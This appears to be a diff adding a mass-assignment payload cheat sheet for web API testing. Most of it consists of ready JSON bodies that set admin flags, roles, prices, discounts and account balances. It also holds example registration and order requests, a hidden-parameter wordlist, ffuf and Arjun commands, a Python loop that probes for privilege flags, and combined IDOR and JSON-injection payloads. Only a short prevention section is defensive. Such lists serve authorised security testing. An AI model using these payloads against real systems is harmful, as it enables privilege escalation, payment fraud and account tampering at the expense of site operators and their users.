@@ -1,0 +1,401 @@
+# Mass Assignment Payloads
+
+## ========================================
+## BASIC MASS ASSIGNMENT
+## ========================================
+
+# Add admin field
+{"username": "attacker", "password": "pass123", "is_admin": true}
+
+# Modify role
+{"email": "user@example.com", "role": "administrator"}
+
+# Change permissions
+{"user_id": 123, "permissions": ["all"]}
+
+## ========================================
+## PRIVILEGE ESCALATION
+## ========================================
+
+# Escalate to admin
+{"is_admin": true}
+{"admin": 1}
+{"role": "admin"}
+{"user_type": "administrator"}
+
+# Add super user flag
+{"is_super_user": true}
+{"superuser": 1}
+
+# Modify account type
+{"account_type": "premium"}
+{"plan": "enterprise"}
+
+## ========================================
+## PARAMETER INJECTION
+## ========================================
+
+# Add hidden parameters
+{"approved": true}
+{"verified": true}
+{"active": true}
+{"enabled": 1}
+
+# Bypass workflow
+{"status": "approved"}
+{"state": "completed"}
+
+## ========================================
+## PRICE MANIPULATION
+## ========================================
+
+# Modify product price
+{"product_id": 1, "price": 0.01}
+
+# Change order total
+{"total": 1.00}
+{"amount": 0}
+
+# Discount manipulation
+{"discount_percent": 100}
+
+## ========================================
+## ACCOUNT MANIPULATION
+## ========================================
+
+# Credits/Balance
+{"credits": 999999}
+{"balance": 1000000}
+{"points": 99999}
+
+# Subscription
+{"subscription_level": "premium"}
+{"trial_end_date": "2099-12-31"}
+
+## ========================================
+## USER CREATION
+## ========================================
+
+# Create admin user
+POST /api/users
+{
+  "username": "attacker",
+  "password": "pass123",
+  "email": "attacker@evil.com",
+  "is_admin": true,
+  "role": "administrator"
+}
+
+## ========================================
+## PROFILE UPDATE
+## ========================================
+
+# Inject additional fields
+PUT /api/profile
+{
+  "first_name": "John",
+  "last_name": "Doe",
+  "verified": true,
+  "email_verified": true,
+  "is_premium": true
+}
+
+## ========================================
+## HIDDEN FIELDS
+## ========================================
+
+# Common hidden fields to try
+"id"
+"user_id"
+"created_at"
+"updated_at"
+"deleted_at"
+"is_deleted"
+"is_admin"
+"is_staff"
+"is_superuser"
+"role"
+"roles"
+"permissions"
+"group"
+"groups"
+"status"
+"state"
+"approved"
+"verified"
+"active"
+"enabled"
+"confirmed"
+
+## ========================================
+## FRAMEWORK-SPECIFIC
+## ========================================
+
+# Rails (attr_accessible bypass)
+{"user": {"is_admin": true}}
+
+# Django
+{"is_staff": true, "is_superuser": true}
+
+# Laravel
+{"role_id": 1}
+
+# Node.js/Express
+{"admin": true}
+
+## ========================================
+## NESTED OBJECTS
+## ========================================
+
+# Nested role assignment
+{
+  "user": {
+    "username": "attacker",
+    "profile": {
+      "role": "admin"
+    }
+  }
+}
+
+# Deep nesting
+{
+  "account": {
+    "settings": {
+      "permissions": {
+        "admin": true
+      }
+    }
+  }
+}
+
+## ========================================
+## ARRAY MANIPULATION
+## ========================================
+
+# Add to arrays
+{"roles": ["user", "admin"]}
+{"permissions": ["read", "write", "delete"]}
+
+# Group membership
+{"groups": [1, 2, 3]}  // Where 1 is admin group
+
+## ========================================
+## BYPASS VALIDATION
+## ========================================
+
+# Type juggling
+{"is_admin": "true"}  // String instead of boolean
+{"price": "0"}  // String instead of number
+
+# Null values
+{"approved": null}  // May bypass checks
+
+## ========================================
+## TIMESTAMP MANIPULATION
+## ========================================
+
+# Modify dates
+{"created_at": "2020-01-01"}
+{"subscription_end": "2099-12-31"}
+{"trial_expires": "2100-01-01"}
+
+## ========================================
+## RELATIONSHIP MANIPULATION
+## ========================================
+
+# Change associations
+{"organization_id": 1}  // Admin organization
+{"team_id": 2}  // Different team
+
+# Parent/Child relationships
+{"parent_id": null}
+{"owner_id": 1}
+
+## ========================================
+## TESTING METHODOLOGY
+## ========================================
+
+# 1. Intercept legitimate request
+POST /api/users
+{"username": "test", "email": "test@example.com"}
+
+# 2. Add hidden parameters
+{"username": "test", "email": "test@example.com", "is_admin": true}
+
+# 3. Check response
+- Was parameter accepted?
+- Was user created as admin?
+
+# 4. Try variations
+- Different parameter names
+- Different data types
+- Nested objects
+
+## ========================================
+## EXPLOITATION EXAMPLES
+## ========================================
+
+# Example 1: User registration
+POST /api/register
+{
+  "username": "attacker",
+  "password": "pass123",
+  "email": "attacker@evil.com",
+  "is_admin": true,
+  "verified": true
+}
+
+# Example 2: Profile update
+PUT /api/users/123
+{
+  "first_name": "John",
+  "role": "administrator",
+  "permissions": ["all"]
+}
+
+# Example 3: Order creation
+POST /api/orders
+{
+  "product_id": 1,
+  "quantity": 1,
+  "price": 0.01,
+  "status": "completed"
+}
+
+## ========================================
+## PARAMETER FUZZING
+## ========================================
+
+# Common admin flags
+is_admin
+isAdmin
+admin
+is_administrator
+administrator
+is_staff
+staff
+is_superuser
+superuser
+root
+
+# Common role parameters
+role
+user_role
+role_id
+user_type
+account_type
+access_level
+permission_level
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Burp Suite
+- Intercept requests
+- Add parameters
+- Observe responses
+
+# Param Miner (Burp extension)
+- Discover hidden parameters
+
+# Arjun
+python3 arjun.py -u http://target.com/api/users
+
+# ffuf for parameter discovery
+ffuf -u http://target.com/api/users -X POST -d '{"FUZZ":"true"}' -w params.txt
+
+## ========================================
+## COMMON VULNERABLE ENDPOINTS
+## ========================================
+
+/api/users
+/api/register
+/api/profile
+/api/account
+/api/settings
+/user/update
+/profile/edit
+/account/update
+
+## ========================================
+## PAYLOAD VARIATIONS
+## ========================================
+
+# Boolean
+"is_admin": true
+"is_admin": 1
+"is_admin": "true"
+"is_admin": "1"
+
+# Strings
+"role": "admin"
+"role": "administrator"
+"role": "root"
+
+# Numbers
+"role_id": 1
+"permission_level": 9999
+
+## ========================================
+## REAL-WORLD SCENARIOS
+## ========================================
+
+# Scenario 1: E-commerce
+Modify price, discount, shipping cost
+
+# Scenario 2: SaaS platform
+Upgrade account tier, extend trial
+
+# Scenario 3: Social platform
+Verify account, increase followers
+
+# Scenario 4: Banking app
+Modify balance, credit limit
+
+## ========================================
+## AUTOMATED TESTING
+## ========================================
+
+# Python script
+import requests
+
+url = "http://target.com/api/users"
+payload = {
+    "username": "test",
+    "email": "test@example.com"
+}
+
+# Add hidden params
+hidden_params = ["is_admin", "role", "permissions", "verified"]
+
+for param in hidden_params:
+    test_payload = payload.copy()
+    test_payload[param] = True
+    r = requests.post(url, json=test_payload)
+    if "admin" in r.text.lower():
+        print(f"Vulnerable to: {param}")
+
+## ========================================
+## PREVENTION TESTING
+## ========================================
+
+# Check if framework:
+- Uses whitelisting
+- Validates all inputs
+- Rejects unknown parameters
+- Has proper access control
+
+## ========================================
+## COMBINED ATTACKS
+## ========================================
+
+# Mass Assignment + IDOR
+PUT /api/users/456
+{"role": "admin"}  // Update other user
+
+# Mass Assignment + HPP
+?user[is_admin]=true
+
+# Mass Assignment + JSON injection
+{"username":"test\",\"is_admin\":true,\"fake\":\""}
